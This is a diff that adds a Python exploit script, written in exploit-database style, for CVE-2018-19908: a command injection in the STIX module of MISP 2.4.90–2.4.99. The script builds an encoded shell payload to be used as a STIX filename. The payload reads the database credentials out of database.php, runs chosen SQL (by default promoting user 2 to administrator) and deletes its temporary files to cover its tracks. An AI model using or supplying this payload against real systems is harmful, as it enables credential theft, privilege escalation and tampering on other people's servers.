@@ -1,0 +1,57 @@
+#-*-coding:utf-8-*-
+#
+# Exploit Title: SQL command execution via command injection in STIX module
+# Date: 2019-17-02
+# Exploit Author: Tm9jdGlz
+# Vendor Homepage: https://www.misp-project.org/
+# Software link: https://www.misp-project.org/download/
+# Version: 2.4.90 - 2.4.99
+# Tested on: 2.4.97
+# CVE: CVE-2018-19908
+# 
+# Use this payload as stix filename
+
+def encode_data(data):
+    from base64 import b64encode
+    from urllib.parse import quote_plus
+
+    b64Data = b64encode(data.encode("utf-8"))
+    urlEncode = quote_plus(b64Data)
+
+    return urlEncode
+
+
+def generate_payload(SQLRequest):
+    payload = 'MISPPath="../../";'\
+            'MISPPDB="$MISPPath/app/Config/database.php";'\
+            'MySQLUUser=$(grep -o -P "(?<=\'login\' => \').*(?=\')" $MISPPDB);'\
+            'MySQLRUser=${{MySQLRUser:-$MySQLUUser}};'\
+            'MySQLUPass=$(grep -o -P "(?<=\'password\' => \').*(?=\')" $MISPPDB);'\
+            'MySQLRPass=${{MySQLRPass:-$MySQLUPass}};'\
+            'MISPDB=$(grep -o -P "(?<=\'database\' => \').*(?=\')" $MISPPDB);'\
+            'mysql -u $MySQLRUser -p$MySQLRPass $MISPDB -e "{}"'
+    return payload.format(SQLRequest)
+
+def generate_exploit(SQLRequest, **kwargs):
+    options = {
+            "inputFile" : kwargs.get("input_file", "data"),
+            "outputFile" : kwargs.get("output_file", "data2"),
+            "payload" : encode_data(generate_payload(SQLRequest))
+    }
+
+    exploit = "; echo '{payload}'>{inputFile};"\
+            "python3 -c 'import urllib.parse;"\
+            'fd=open(\\"{outputFile}\\",\\"w\\");'\
+            'fd.write(urllib.parse.unquote_plus(open(\\"{inputFile}\\").read()));'\
+            "fd.close()';"\
+            "base64 -d {outputFile}>{inputFile};"\
+            "sh {inputFile};"\
+            "rm {inputFile} {outputFile} #".format(**options)
+    return exploit
+
+def main():
+    SQLRequest = "UPDATE users SET role_id=1 WHERE id = 2"
+    print(generate_exploit(SQLRequest))
+
+if __name__ == "__main__":
+    main()
